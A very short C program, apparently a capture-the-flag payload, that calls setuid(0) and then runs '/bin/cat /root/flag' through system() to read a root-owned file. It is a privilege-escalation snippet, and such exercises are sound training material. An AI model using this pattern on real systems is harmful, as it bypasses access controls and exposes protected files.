#include <unistd.h>   // for setuid()
#include <stdlib.h>   // for system()

int main() {
    setuid(0);
    system("/bin/cat /root/flag");
    return 0;
}
